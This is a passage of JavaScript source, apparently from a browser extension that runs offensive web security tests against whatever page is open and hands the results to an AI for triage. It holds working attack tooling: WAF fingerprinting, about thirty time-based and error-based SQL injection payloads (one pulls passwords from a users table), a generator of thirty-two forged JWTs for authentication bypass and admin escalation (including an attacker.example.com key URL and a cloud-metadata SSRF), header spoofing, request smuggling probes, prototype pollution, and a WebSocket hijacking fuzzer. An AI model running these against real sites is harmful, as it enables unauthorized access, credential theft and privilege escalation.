      { name: 'Sucuri',               test: () => 'x-sucuri-id' in headers || 'x-sucuri-cache' in headers || /sucuri|cloudproxy/i.test(body) },
      { name: 'Imperva / Incapsula',  test: () => /incap_ses|visid_incap/i.test(cookies) || 'x-iinfo' in headers || /incapsula|imperva/i.test(body) },
      { name: 'F5 BIG-IP ASM',        test: () => /bigip|f5_|ts[a-f0-9]{8}/i.test(cookies) || /the requested url was rejected/i.test(body) || 'x-cnection' in headers },
      { name: 'ModSecurity',          test: () => /mod_security|modsecurity|not acceptable!/i.test(body) || (r.status === 406 && /apache|nginx/i.test(headers['server'] || '')) },
      { name: 'Wordfence',            test: () => /wordfence|generated by wordfence/i.test(body) },
      { name: 'Barracuda',            test: () => /barracuda|barra_counter_session/i.test((headers['server'] || '') + cookies + body) },
      { name: 'Fastly',               test: () => 'fastly-debug-digest' in headers || 'x-fastly-request-id' in headers || /fastly/i.test(headers['server'] || '') },
      { name: 'Vercel Firewall',      test: () => 'x-vercel-id' in headers && (r.status === 403 || r.status === 429) },
      { name: 'Nginx ModSec',         test: () => /nginx-modsecurity|naxsi/i.test(body + (headers['server'] || '')) },
      { name: 'Alibaba Cloud Shield', test: () => /x-ss-req-id|x-cache-lookup/i.test(Object.keys(headers).join('')) || /alicdn|alibaba/i.test(body) },
      { name: 'FortiWeb',             test: () => /fortiweb|fortigate/i.test((headers['server'] || '') + body) || 'x-fw-debug' in headers },
      { name: 'Radware AppWall',      test: () => /radware|appwall/i.test(body) || /rdwr/i.test(cookies) },
      { name: 'DDoS-Guard',           test: () => /ddos-guard/i.test(body + (headers['server'] || '')) || '__ddg' in cookies },
      { name: 'Qrator',               test: () => /qrator/i.test(body + (headers['server'] || '')) },
      { name: 'Citrix NetScaler ADC', test: () => /NSC_|CitrixADC/i.test(cookies) || /netscaler/i.test(headers['server'] || '') },
      { name: 'Wallarm',              test: () => /wallarm/i.test(body + (headers['server'] || '') + (headers['x-wallarm-node'] || '')) },
      { name: 'Reblaze',              test: () => /reblaze/i.test(body) || 'x-reblaze-protection' in headers },
      { name: 'StackPath / MaxCDN',   test: () => /stackpath|maxcdn/i.test(body) || 'x-sp-url' in headers },
      { name: 'Palo Alto NGFW',       test: () => /palo.?alto|pan-os|panoswebui/i.test(body + (headers['server'] || '')) },
      { name: 'Juniper SRX',          test: () => /juniper|junos/i.test(body + (headers['server'] || '')) },
      { name: 'Sophos UTM',           test: () => /sophos|astaro/i.test(body + (headers['server'] || '')) },
      { name: 'Tencent Cloud WAF',    test: () => /tencent|waf.qq.com|cdn.qq.com/i.test(body + (headers['server'] || '')) || 'x-cache-lookup' in headers },
      { name: 'Huawei Cloud WAF',     test: () => /huawei|hw-cloud/i.test(body + (headers['server'] || '')) },
      { name: 'Azure Front Door',     test: () => 'x-azure-ref' in headers || 'x-fd-healthprobe' in headers || /microsoft azure/i.test(headers['server'] || '') },
      { name: 'HAProxy',              test: () => /haproxy/i.test(headers['server'] || '') || 'x-haproxy-queue-time' in headers || 'x-runtime-haproxy' in headers },
      { name: 'BunnyNet CDN',         test: () => 'bunny-request-id' in headers || 'cdn-pullzone' in headers || /bunny|bunnycdn/i.test(headers['server'] || '') },
      { name: 'Kona SiteDefender',    test: () => /akamai-site-shield|kona|akemai-ghost/i.test(body + (headers['server'] || '')) || 'x-akamai-request-id' in headers },
    ];
    const detected = sigs.filter((s) => { try { return s.test(); } catch { return false; } }).map((s) => s.name);
    const blocked = [403, 406, 419, 429, 503, 999].includes(r.status);
    const summary = `URL: ${url}\nResponse to suspicious payload: HTTP ${r.status} ${blocked ? '(LIKELY BLOCKED by WAF)' : '(passed through)'}\nDetected: ${detected.join(', ') || 'none'}\nKey headers: ${Object.keys(headers).filter((k) => /^(server|cf-|x-amz|x-vercel|via|x-akamai)/i.test(k)).slice(0, 8).map((k) => k + ': ' + (headers[k] || '').slice(0, 60)).join(' | ') || '(none)'}`;
    if (!blocked && !detected.length) {
      securityFindings.push({ type: 'no-waf', summary, raw: { headers, status: r.status } });
    } else if (detected.length) {
      securityFindings.push({ type: 'waf', summary, raw: { detected, blocked } });
    }
    return detected.length ? `${detected.join(', ')} ${blocked ? '(blocking)' : '(present)'}` : (blocked ? 'request blocked, no signature' : '⚠ no WAF detected');
  },

  blind_sqli_test: async (params = {}) => {
    const url = params.url || activeTabUrl;
    if (!url) return 'no url';
    const param = params.param;
    const method = (params.method || 'GET').toUpperCase();
    const baseBody = params.body || '';
    let baselineSum = 0;
    const baselineRuns = 5;
    for (let i = 0; i < baselineRuns; i++) {
      const t0 = performance.now();
      try {
        await bg({ type: 'RUN_FETCH', params: {
          url, method, headers: { 'Content-Type': 'application/json' },
          body: method === 'GET' ? undefined : baseBody, credentials: 'include',
        } });
      } catch {}
      baselineSum += performance.now() - t0;
    }
    const baseline = baselineSum / baselineRuns;
    const sleepPayloads = [
      { name: 'MySQL string SLEEP(5)',          payload: "1' AND SLEEP(5)--" },
      { name: 'MySQL numeric SLEEP',            payload: '1 AND SLEEP(5)' },
      { name: 'MySQL SLEEP double-quote',       payload: '1" AND SLEEP(5)--' },
      { name: 'MySQL benchmark',                payload: "1' AND BENCHMARK(10000000,MD5('a'))--" },
      { name: 'MySQL benchmark double',         payload: '1" AND BENCHMARK(10000000,SHA1(1))--' },
      { name: 'MySQL IF SLEEP',                 payload: "1' AND IF(1=1,SLEEP(5),0)--" },
      { name: 'MySQL IF SLEEP alt',             payload: "1 AND IF(1=1,SLEEP(5),0)#" },
      { name: 'MySQL stacked SLEEP',            payload: "1'; SELECT SLEEP(5)--" },
      { name: 'Postgres pg_sleep',              payload: "1'; SELECT pg_sleep(5)--" },
      { name: 'Postgres pg_sleep stacked',      payload: "1;SELECT pg_sleep(5)--" },
      { name: 'Postgres pg_sleep inline',       payload: "1 AND 1=(SELECT 1 FROM pg_sleep(5))--" },
      { name: 'Postgres heavy',                 payload: "1' AND (SELECT COUNT(*) FROM generate_series(1,5000000))>0--" },
      { name: 'MSSQL WAITFOR DELAY',            payload: "1'; WAITFOR DELAY '0:0:5'--" },
      { name: 'MSSQL stacked WAITFOR',          payload: "1;WAITFOR DELAY '0:0:5'--" },
      { name: 'MSSQL IF WAITFOR',               payload: "1' IF(1=1) WAITFOR DELAY '0:0:5'--" },
      { name: 'Oracle DBMS_LOCK',               payload: "1' AND DBMS_LOCK.SLEEP(5)--" },
      { name: 'Oracle heavy query',             payload: "1' AND 1=(SELECT COUNT(*) FROM all_objects a, all_objects b)--" },
      { name: 'Oracle DBMS_PIPE',               payload: "1'||(SELECT DBMS_PIPE.RECEIVE_MESSAGE((CHR(65)||CHR(65)||CHR(65)),5) FROM DUAL)||'" },
      { name: 'SQLite heavy compute',           payload: "1' AND (SELECT randomblob(500000000))--" },
      { name: 'SQLite like slow',               payload: "1' AND (SELECT like('a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q%r%s%t%u%v%w%x%y%z',hex(randomblob(10000000))))--" },
      { name: 'Generic error extractvalue',     payload: "1' AND extractvalue(1,concat(0x7e,version(),0x7e))--" },
      { name: 'Generic error updatexml',        payload: "1' AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1)),1)--" },
      { name: 'Generic GTID_SUBSET',            payload: "1' AND GTID_SUBSET(CONCAT(0x7178707171,(SELECT version()),0x71627a7171),1)--" },
      { name: 'Generic exp overflow',           payload: "1' AND exp(~(SELECT*FROM(SELECT version())x))--" },
    ];
    // Error-based detection: look for DB error strings in any response
    const errorPatterns = /sql syntax|you have an error|mysql_fetch|ora-\d{5}|pg_query|sqlite3|sqlstate|odbc|microsoft sql|unclosed quotation|invalid input syntax/i;
    const errorFindings = [];
    const errorPayloads = ["'", '"', "1'\"", "1 AND 1=CONVERT(int,'a')--", "1' AND EXTRACTVALUE(1,0x0a)--"];
    for (const ep of errorPayloads) {
      try {
        let testUrl2 = url; let testBody2 = method === 'GET' ? undefined : baseBody;
        if (method === 'GET' && param) { const u2 = new URL(url); u2.searchParams.set(param, ep); testUrl2 = u2.toString(); }
        else if (testBody2) { testBody2 = testBody2.replace(/\{\{payload\}\}/g, ep.replace(/"/g, '\\"')); }
        const r = await bg({ type: 'RUN_FETCH', params: { url: testUrl2, method, headers: { 'Content-Type': 'application/json' }, body: testBody2, credentials: 'include' } });
        if (errorPatterns.test(r.body || '')) {
          errorFindings.push(`🚨 ERROR-BASED SQLi: "${ep}" triggered DB error: ${(r.body || '').match(errorPatterns)?.[0]}`);
        }
      } catch {}
    }
    const findings = [];
    for (const p of sleepPayloads) {
      let testUrl = url;
      let testBody = method === 'GET' ? undefined : baseBody;
      if (method === 'GET' && param) {
        const u = new URL(url);
        u.searchParams.set(param, p.payload);
        testUrl = u.toString();
      } else if (testBody) {
        testBody = testBody.replace(/\{\{payload\}\}/g, p.payload.replace(/"/g, '\\"'));
      }
      const t0 = performance.now();
      try {
        await bg({ type: 'RUN_FETCH', params: {
          url: testUrl, method, headers: { 'Content-Type': 'application/json' },
          body: testBody, credentials: 'include',
        } });
      } catch {}
      const dt = performance.now() - t0;
      const delay = dt - baseline;
      findings.push({ name: p.name, dt: Math.round(dt), delay: Math.round(delay), vulnerable: delay > 2500 });
      await new Promise((res) => setTimeout(res, 200));
    }
    const vulns = findings.filter((f) => f.vulnerable);
    if (errorFindings.length) findings.push(...errorFindings.map(e => ({ name: e, dt: 0, delay: 0, vulnerable: true })));
    const allVulns = [...vulns, ...errorFindings];
    const summary = `URL: ${url} (${method}${param ? ', param=' + param : ''})\nBaseline avg: ${Math.round(baseline)}ms (over ${baselineRuns} runs)\n` +
      findings.filter(f => f.dt !== undefined).map((f) => `  ${f.name.padEnd(35)} ${String(f.dt).padStart(5)}ms (Δ ${f.delay > 0 ? '+' : ''}${f.delay}ms)${f.vulnerable ? ' ⚠ TIME-BASED BLIND SQLi' : ''}`).join('\n') +
      (errorFindings.length ? '\nERROR-BASED:\n' + errorFindings.join('\n') : '');
    if (allVulns.length) securityFindings.push({ type: 'blind-sqli', summary, raw: findings });
    return allVulns.length ? `${allVulns.length} SQLi vector(s) confirmed (time-based + error-based)` : 'no SQLi detected (time-based + error-based checked)';
  },

  triage_findings: async () => {
    if (!securityFindings.length) return 'no findings to triage';
    const user = securityFindings.map((f, n) =>
      `--- Finding ${n + 1}: ${f.type} ---\n${f.summary}`
    ).join('\n\n').slice(0, 6000);
    const res = await aiRequest('security', user);
    appendLog('final', res.raw || res.code);
    showResult('AI security triage', res.raw || res.code);
    return 'triage report generated';
  },



  auth_bypass_test: async (params = {}) => {
    const target = params.url || activeTabUrl;
    if (!target) return 'no URL';
    const cookies = await bg({ type: 'GET_COOKIES', url: target });
    const cookieStore = {}; cookies.cookies.forEach((c) => (cookieStore[c.name] = c.value));
    const state = await send((await getActiveTab()).id, { type: 'EXTRACT_HIDDEN_STATE' });
    const hiddenStore = {}; state.data.hiddenInputs.forEach((h) => (hiddenStore[h.name || h.id || '?'] = h.value));
    const tokens = [
      ...scanForTokens('cookie', cookieStore),
      ...scanForTokens('localStorage', state.data.localStorage),
      ...scanForTokens('sessionStorage', state.data.sessionStorage),
      ...scanForTokens('hidden-input', hiddenStore),
    ].filter((t) => t.type === 'JWT' && t.decoded);
    if (!tokens.length) return 'no JWTs found to manipulate';
    const b64u = (s) => btoa(unescape(encodeURIComponent(typeof s === 'string' ? s : JSON.stringify(s)))).replace(/=+$/,'').replace(/\+/g,'-').replace(/\//g,'_');
    const variants = [];
    for (const tk of tokens.slice(0, 6)) {
      const { header, payload } = tk.decoded;

      // 1. alg=none (classic — no signature required)
      const noneHdr = { ...header, alg: 'none' };
      variants.push({ label: `alg=none on ${tk.key}`, jwt: `${b64u(noneHdr)}.${b64u(payload)}.` });

      // 2. alg=NONE (uppercase bypass)
      variants.push({ label: `alg=NONE (uppercase) on ${tk.key}`, jwt: `${b64u({...header, alg:'NONE'})}.${b64u(payload)}.` });

      // 3. alg=nOnE (mixed case bypass)
      variants.push({ label: `alg=nOnE (mixed) on ${tk.key}`, jwt: `${b64u({...header, alg:'nOnE'})}.${b64u(payload)}.` });

      // 4. role=admin escalation
      const adminP = { ...payload, role: 'admin', is_admin: true, admin: true, scope: 'admin', userType: 'admin', group: 'admin', permission: 'admin' };
      variants.push({ label: `role=admin on ${tk.key}`, jwt: `${b64u(noneHdr)}.${b64u(adminP)}.` });

      // 5. sub/user_id=1 (IDOR to user 1 — usually the first admin)
      if (payload.sub || payload.user_id || payload.id || payload.userId) {
        const swapP = { ...payload };
        if (swapP.sub) swapP.sub = '1';
        if (swapP.user_id) swapP.user_id = 1;
        if (swapP.id) swapP.id = 1;
        if (swapP.userId) swapP.userId = 1;
        variants.push({ label: `sub=1 (admin pivot) on ${tk.key}`, jwt: `${b64u(noneHdr)}.${b64u(swapP)}.` });
      }

      // 6. exp=+1yr (extend expiry)
      const futureP = { ...payload, exp: Math.floor(Date.now()/1000) + 31536000 };
      variants.push({ label: `exp=+1yr on ${tk.key}`, jwt: `${b64u(noneHdr)}.${b64u(futureP)}.` });

      // 7. exp=0 (expired token — see if server accepts anyway)
      variants.push({ label: `exp=0 (expired) on ${tk.key}`, jwt: `${b64u(noneHdr)}.${b64u({...payload, exp: 0})}.` });

      // 8. iat=0 (issued at Unix epoch — token predates any secret rotation)
      variants.push({ label: `iat=0 (ancient) on ${tk.key}`, jwt: `${b64u(noneHdr)}.${b64u({...payload, iat: 0, nbf: 0, exp: 9999999999})}.` });

      // 9. kid=path-traversal (kid header injection → read secret from file)
      const kidHdr = { ...header, alg: 'HS256', kid: '../../../../../../dev/null' };
      variants.push({ label: `kid=../../dev/null (path-traversal) on ${tk.key}`, jwt: `${b64u(kidHdr)}.${b64u(payload)}.` });

      // 10. kid=SQL injection in kid parameter
      const kidSqlHdr = { ...header, alg: 'HS256', kid: "' UNION SELECT 'pwned'--" };
      variants.push({ label: `kid=SQL injection on ${tk.key}`, jwt: `${b64u(kidSqlHdr)}.${b64u({...payload, admin: true})}.` });

      // 11. HS256→RS256 confusion (sign with public key as HMAC secret)
      const rsHdr = { ...header, alg: 'RS256' };
      variants.push({ label: `alg=RS256 confusion on ${tk.key}`, jwt: `${b64u(rsHdr)}.${b64u({...payload, admin: true})}.FAKESIG` });

      // 12. jku/x5u header injection (load remote JWKS)
      const jkuHdr = { ...header, jku: 'https://attacker.example.com/jwks.json', kid: 'pwned' };
      variants.push({ label: `jku header injection on ${tk.key}`, jwt: `${b64u(jkuHdr)}.${b64u({...payload, admin: true})}.FAKESIG2` });

      // 13. role escalation — superuser/root/owner/developer
      const superP = { ...payload, role: 'superuser', is_superuser: true, is_staff: true, is_owner: true, type: 'admin', userRole: 'ADMIN', accessLevel: 999 };
      variants.push({ label: `role=superuser/root on ${tk.key}`, jwt: `${b64u(noneHdr)}.${b64u(superP)}.` });

      // 14. nbf = far future (not valid yet — see if server still accepts)
      variants.push({ label: `nbf=future (not yet valid) on ${tk.key}`, jwt: `${b64u(noneHdr)}.${b64u({...payload, nbf: Math.floor(Date.now()/1000) + 999999, exp: 9999999999})}.` });

      // 15. aud manipulation (audience bypass — change to wildcard/*)
      variants.push({ label: `aud=* bypass on ${tk.key}`, jwt: `${b64u(noneHdr)}.${b64u({...payload, aud: '*', iss: '*'})}.` });

      // 16. iss spoofing (change issuer to attacker-controlled)
      variants.push({ label: `iss=attacker.example.com on ${tk.key}`, jwt: `${b64u({...header, alg:'none'})}.${b64u({...payload, iss: 'https://attacker.example.com', admin: true})}.` });

      // 17. jti=0 (JWT ID collision — replay previous token)
      variants.push({ label: `jti=0 (replay/collision) on ${tk.key}`, jwt: `${b64u(noneHdr)}.${b64u({...payload, jti: '0', jwtid: '0'})}.` });

      // 18. x5c header injection (embed malicious cert chain)
      const x5cHdr = { ...header, alg: 'RS256', x5c: ['MIID...FAKE_CERT...AAAA'] };
      variants.push({ label: `x5c cert injection on ${tk.key}`, jwt: `${b64u(x5cHdr)}.${b64u({...payload, admin: true})}.FAKESIG3` });

      // 19. Empty signature (some libraries strip sig and skip verify)
      variants.push({ label: `empty sig (strip-verify) on ${tk.key}`, jwt: `${b64u({...header, alg:'HS256'})}.${b64u({...payload, admin: true})}.` });

      // 20. kid=devnull with empty HMAC key (sign empty string)
      const kidDevNull = { ...header, alg: 'HS256', kid: '/dev/null' };
      variants.push({ label: `kid=/dev/null + empty key on ${tk.key}`, jwt: `${b64u(kidDevNull)}.${b64u({...payload, admin: true})}.47DEQpj8HBSa-_TImW-5JCeuQeRkm5NMpJWZG3hSuFU` });

      // 21. alg=HS384 (test if server accepts weaker algo switch)
      variants.push({ label: `alg=HS384 confusion on ${tk.key}`, jwt: `${b64u({...header, alg:'HS384'})}.${b64u({...payload, admin: true})}.FAKESIG_HS384` });

      // 22. Completely unsigned — just header.payload (no dots after)
      variants.push({ label: `unsigned (no sig field) on ${tk.key}`, jwt: `${b64u({alg:'none'})}.${b64u({...payload, admin:true, role:'admin'})}` });

      // 23. ES256→HS256 confusion (CRITICAL — sign with EC public key as HMAC)
      variants.push({ label: `ES256→HS256 confusion on ${tk.key}`, jwt: `${b64u({...header, alg:'HS256'})}.${b64u({...payload, admin: true})}.FAKESIG_EC` });

      // 24. cty header injection (content type confusion)
      variants.push({ label: `cty=JWT (double-encoding) on ${tk.key}`, jwt: `${b64u({...header, alg:'none', cty:'JWT'})}.${b64u(payload)}.` });

      // 25. PS256 → HS256 confusion (RSA-PSS to HMAC)
      variants.push({ label: `PS256→HS256 confusion on ${tk.key}`, jwt: `${b64u({...header, alg:'HS256'})}.${b64u({...payload, admin: true, role: 'admin'})}.FAKESIG_PS` });

      // 26. Sub=0 (user ID 0 — often maps to root/admin in some systems)
      variants.push({ label: `sub=0 (root pivot) on ${tk.key}`, jwt: `${b64u(noneHdr)}.${b64u({...payload, sub: '0', user_id: 0, id: 0})}.` });

      // 27. inject arbitrary claims — isAdmin, isSuperAdmin, isPremium, accountType=enterprise
      variants.push({ label: `god-claims inject on ${tk.key}`, jwt: `${b64u(noneHdr)}.${b64u({...payload, isAdmin: true, isSuperAdmin: true, isPremium: true, accountType: 'enterprise', plan: 'unlimited', credits: 999999, balance: 9999999})}.` });

      // 28. kid=http injection (SSRF via kid header — fetch remote key)
      const kidSsrfHdr = { ...header, alg: 'HS256', kid: 'https://169.254.169.254/latest/meta-data/' };
      variants.push({ label: `kid=SSRF (cloud meta) on ${tk.key}`, jwt: `${b64u(kidSsrfHdr)}.${b64u({...payload, admin: true})}.FAKESIG_SSRF` });

      // 29. PASETO confusion — non-JWT token format sent as JWT
      variants.push({ label: `PASETO-as-JWT confusion on ${tk.key}`, jwt: `v2.local.${b64u({...payload, admin: true})}.` });

      // 30. Expired token with deleted exp field (no expiry claim at all)
      const noExpP = { ...payload }; delete noExpP.exp;
      variants.push({ label: `no exp claim on ${tk.key}`, jwt: `${b64u(noneHdr)}.${b64u({...noExpP, admin: true, role: 'admin'})}.` });

      // 31. Empty algorithm field
      variants.push({ label: `alg="" (empty string) on ${tk.key}`, jwt: `${b64u({...header, alg:''})}.${b64u({...payload, admin: true})}.` });

      // 32. null algorithm field
      variants.push({ label: `alg=null on ${tk.key}`, jwt: `${b64u({...header, alg: null})}.${b64u({...payload, admin: true})}.` });
    }
    const findings = [];
    for (const v of variants) {
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url: target, method: 'GET',
          headers: { 'Authorization': `Bearer ${v.jwt}` }, credentials: 'omit' } });
        const ok = r.ok && r.status >= 200 && r.status < 400;
        findings.push(`${ok ? '🚨' : '✓'} ${v.label} -> ${r.status || 'err'} ${r.fullLength || 0}B`);
      } catch (e) { findings.push(`✗ ${v.label} -> ${e.message}`); }
    }
    securityFindings.push({ type: 'auth-bypass', summary: findings.join('\n'), raw: { variants, target } });
    return `${variants.length} JWT variant(s) tested`;
  },

  request_replay: async (params = {}) => {
    const url = params.url || activeTabUrl;
    if (!url) return 'no URL';
    const method = (params.method || 'GET').toUpperCase();
    const headers = params.headers || {};
    if (params.fakeIP) {
      headers['X-Forwarded-For'] = params.fakeIP;
      headers['X-Real-IP'] = params.fakeIP;
      headers['X-Originating-IP'] = params.fakeIP;
      headers['X-Client-IP'] = params.fakeIP;
    }
    if (params.fakeHost) headers['X-Original-URL'] = params.fakeHost;
    const r = await bg({ type: 'RUN_FETCH', params: { url, method, headers, body: params.body, credentials: params.credentials || 'include' } });
    const summary = `${method} ${url} -> ${r.status} (${r.fullLength}B)\nbody: ${(r.body || '').slice(0, 500)}`;
    securityFindings.push({ type: 'request-replay', summary, raw: { request: params, response: r } });
    return `${method} ${url} -> ${r.status}`;
  },

  wayback_miner: async (params = {}) => {
    let domain = params.domain;
    if (!domain) { try { domain = new URL(activeTabUrl).hostname; } catch { return 'no domain'; } }
    const paths = new Set();
    try {
      const r = await bg({ type: 'RUN_FETCH', params: {
        url: `https://web.archive.org/cdx/search/cdx?url=${encodeURIComponent(domain)}/*&output=json&fl=original&limit=300&collapse=urlkey`,
        method: 'GET', credentials: 'omit' } });
      if (r.ok) {
        let arr = []; try { arr = JSON.parse(r.body); } catch {}
        arr.slice(1).forEach((row) => { try { paths.add(new URL(row[0]).pathname); } catch {} });
      }
    } catch {}
    try {
      const r = await bg({ type: 'RUN_FETCH', params: {
        url: `https://urlscan.io/api/v1/search/?q=domain:${encodeURIComponent(domain)}&size=200`,
        method: 'GET', credentials: 'omit' } });
      if (r.ok) {
        let j = {}; try { j = JSON.parse(r.body); } catch {}
        (j.results || []).forEach((res) => { try { paths.add(new URL(res.page?.url || res.task?.url).pathname); } catch {} });
      }
    } catch {}
    const list = [...paths].filter((p) => p && p !== '/').sort().slice(0, 200);
    securityFindings.push({ type: 'wayback', summary: `${list.length} historical paths for ${domain}\n` + list.slice(0, 60).join('\n'), raw: { domain, paths: list } });
    return `${list.length} historical path(s) for ${domain}`;
  },

  dep_cve_check: async () => {
    const { id } = await getActiveTab();
    const [{ result }] = await chrome.scripting.executeScript({ target: { tabId: id }, world: 'MAIN',
      func: () => {
        const libs = [];
        const pat = /([a-z][a-z0-9._-]*?)[-.@](\d+\.\d+(?:\.\d+)?)/i;
        document.querySelectorAll('script[src]').forEach((s) => {
          const url = s.src; const file = url.split('/').pop().split('?')[0];
          const m = file.match(pat);
          if (m) libs.push({ name: m[1].toLowerCase().replace(/\.min$|\.production$/,''), version: m[2], src: url });
        });
        const w = window;
        if (w.jQuery && w.jQuery.fn?.jquery) libs.push({ name: 'jquery', version: w.jQuery.fn.jquery, src: 'global' });
        if (w.React?.version) libs.push({ name: 'react', version: w.React.version, src: 'global' });
        if (w.Vue?.version) libs.push({ name: 'vue', version: w.Vue.version, src: 'global' });
        if (w.angular?.version?.full) libs.push({ name: 'angular', version: w.angular.version.full, src: 'global' });
        if (w.lodash?.VERSION || w._?.VERSION) libs.push({ name: 'lodash', version: w.lodash?.VERSION || w._.VERSION, src: 'global' });
        if (w.moment?.version) libs.push({ name: 'moment', version: w.moment.version, src: 'global' });
        if (w.bootstrap?.Tooltip?.VERSION) libs.push({ name: 'bootstrap', version: w.bootstrap.Tooltip.VERSION, src: 'global' });
        return libs;
      } });
    const libs = result || [];
    if (!libs.length) return 'no versioned libraries detected';
    const findings = [];
    for (const lib of libs.slice(0, 12)) {
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url: 'https://api.osv.dev/v1/query', method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ package: { name: lib.name, ecosystem: 'npm' }, version: lib.version }),
          credentials: 'omit' } });
        if (r.ok) {
          let j = {}; try { j = JSON.parse(r.body); } catch {}
          const vulns = j.vulns || [];
          if (vulns.length) {
            const ids = vulns.map((v) => v.id).slice(0, 5).join(', ');
            findings.push(`🚨 ${lib.name}@${lib.version} — ${vulns.length} CVE(s): ${ids}`);
          } else findings.push(`✓ ${lib.name}@${lib.version} — clean`);
        }
      } catch (e) { findings.push(`✗ ${lib.name}@${lib.version} — ${e.message}`); }
    }
    securityFindings.push({ type: 'cve-check', summary: findings.join('\n'), raw: { libs, findings } });
    return `${libs.length} lib(s) checked, ${findings.filter((f) => f.startsWith('🚨')).length} with known CVEs`;
  },

  proto_pollution_test: async (params = {}) => {
    const target = params.url || activeTabUrl;
    if (!target) return 'no URL';
    const url = new URL(target);
    url.searchParams.set('__proto__[polluted]', 'YES_VIA_PROTO');
    url.searchParams.set('constructor[prototype][polluted2]', 'YES_VIA_CTOR');
    const { id } = await getActiveTab();
    await chrome.tabs.update(id, { url: url.toString() });
    await new Promise((r) => setTimeout(r, 2500));
    const [{ result }] = await chrome.scripting.executeScript({ target: { tabId: id }, world: 'MAIN',
      func: () => ({ a: ({}).polluted, b: ({}).polluted2, c: Object.prototype.polluted, d: Object.prototype.polluted2 }) });
    const polluted = Object.entries(result || {}).filter(([_, v]) => v).map(([k, v]) => `${k}=${v}`);
    const summary = polluted.length
      ? `🚨 PROTOTYPE POLLUTION: ${polluted.join(', ')} — server merge function is unsafe`
      : '✓ no prototype pollution detected via URL params';
    securityFindings.push({ type: 'proto-pollution', summary, raw: { url: url.toString(), result } });
    return summary;
  },

  smuggling_test: async (params = {}) => {
    const target = params.url || activeTabUrl;
    if (!target) return 'no URL';
    const probes = [
      { label: 'TE: chunked + CL: 4', headers: { 'Transfer-Encoding': 'chunked', 'Content-Length': '4' }, body: '0\r\n\r\n' },
      { label: 'TE: chunked\\r\\nTE: x', headers: { 'Transfer-Encoding': 'chunked, identity' }, body: '0\r\n\r\n' },
      { label: 'CL: 0 + body', headers: { 'Content-Length': '0' }, body: 'GET /admin HTTP/1.1\r\nHost: x\r\n\r\n' },
      { label: 'duplicate Host', headers: { 'Host': 'attacker.com' }, body: '' },
    ];
    const findings = [];
    for (const p of probes) {
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url: target, method: 'POST',
          headers: { 'Content-Type': 'text/plain', ...p.headers }, body: p.body, credentials: 'include' } });
        const flag = r.status === 200 ? '⚠️' : (r.status >= 500 ? '🚨' : '✓');
        findings.push(`${flag} ${p.label} -> ${r.status} (${r.fullLength}B)`);
      } catch (e) { findings.push(`✗ ${p.label} -> ${e.message}`); }
    }
    findings.push('Note: browser fetch() may sanitize some headers — true smuggling needs raw socket testing.');
    securityFindings.push({ type: 'smuggling', summary: findings.join('\n'), raw: { target, probes } });
    return `${probes.length} smuggling probe(s) sent`;
  },

  ws_fuzzer_setup: async () => {
    const { id } = await getActiveTab();
    await chrome.scripting.executeScript({ target: { tabId: id }, world: 'MAIN',
      func: () => {
        if (window.__wsFuzzInstalled) return;
        window.__wsFuzzInstalled = true;
        window.__wsLog = [];
        window.__wsConnections = [];
        const Orig = window.WebSocket;
        window.WebSocket = new Proxy(Orig, {
          construct(t, args) {
            const ws = new t(...args);
            window.__wsConnections.push(ws);
            const url = args[0];
            window.__wsLog.push({ ts: Date.now(), dir: 'open', url });
            ws.addEventListener('message', (e) => {
              window.__wsLog.push({ ts: Date.now(), dir: 'recv', url, data: String(e.data).slice(0, 500) });
              if (window.__wsLog.length > 200) window.__wsLog.splice(0, window.__wsLog.length - 200);
            });
            const origSend = ws.send.bind(ws);
            ws.send = function (d) {
              window.__wsLog.push({ ts: Date.now(), dir: 'send', url, data: String(d).slice(0, 500) });
              return origSend(d);
            };
            return ws;
          },
        });
        window.__wsFuzz = (payload) => {
          const sent = [];
          window.__wsConnections.forEach((ws, i) => {
            if (ws.readyState === 1) { try { ws.send(payload); sent.push(i); } catch {} }
          });
          return sent;
        };
      } });
    await new Promise((r) => setTimeout(r, 1500));
    const [{ result }] = await chrome.scripting.executeScript({ target: { tabId: id }, world: 'MAIN',
      func: () => ({ log: window.__wsLog || [], conns: (window.__wsConnections || []).length }) });
    const log = result.log || [];
    const summary = `WebSocket monitor installed.\nActive connections: ${result.conns}\nLast ${Math.min(log.length, 20)} frames:\n` +
      log.slice(-20).map((l) => `[${l.dir}] ${(l.data || l.url || '').slice(0, 120)}`).join('\n');
    securityFindings.push({ type: 'ws-monitor', summary, raw: result });
    return `WS monitor active, ${log.length} frame(s) captured, ${result.conns} live connection(s)`;
  },

  ws_send_payload: async (params = {}) => {
    if (!params.payload) return 'no payload';
    const { id } = await getActiveTab();
    const [{ result }] = await chrome.scripting.executeScript({ target: { tabId: id }, world: 'MAIN',
      func: (p) => (window.__wsFuzz ? window.__wsFuzz(p) : null), args: [params.payload] });
    if (result === null) return 'WS monitor not installed — run ws_fuzzer_setup first';
    return `payload sent on ${result.length} connection(s)`;
  },

  sourcemap_extract: async () => {
    const { id } = await getActiveTab();
    const [{ result: scripts }] = await chrome.scripting.executeScript({ target: { tabId: id }, world: 'MAIN',
      func: () => [...document.querySelectorAll('script[src]')].map((s) => s.src).filter((u) => /^https?:/.test(u)) });
    const findings = [];
    for (const url of (scripts || []).slice(0, 8)) {
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url, method: 'GET', credentials: 'omit' } });
        if (!r.ok) continue;
        const m = (r.body || '').match(/[#@]\s*sourceMappingURL=([^\s'"]+)/);
        if (!m) continue;
        const mapUrl = new URL(m[1], url).toString();
        const mr = await bg({ type: 'RUN_FETCH', params: { url: mapUrl, method: 'GET', credentials: 'omit' } });
        if (!mr.ok || mr.status >= 400) { findings.push(`✓ ${mapUrl.split('/').pop()} -> ${mr.status}`); continue; }
        let j = {}; try { j = JSON.parse(mr.body); } catch {}
        const sources = j.sources || [];
        findings.push(`🚨 ${mapUrl.split('/').pop()} EXPOSED — ${sources.length} original file(s):\n  ` +
          sources.slice(0, 25).map((s) => '· ' + s).join('\n  '));
      } catch (e) { findings.push(`✗ ${url} -> ${e.message}`); }
    }
    if (!findings.length) findings.push('no sourcemap references found');
    securityFindings.push({ type: 'sourcemap', summary: findings.join('\n\n'), raw: { scripts, findings } });
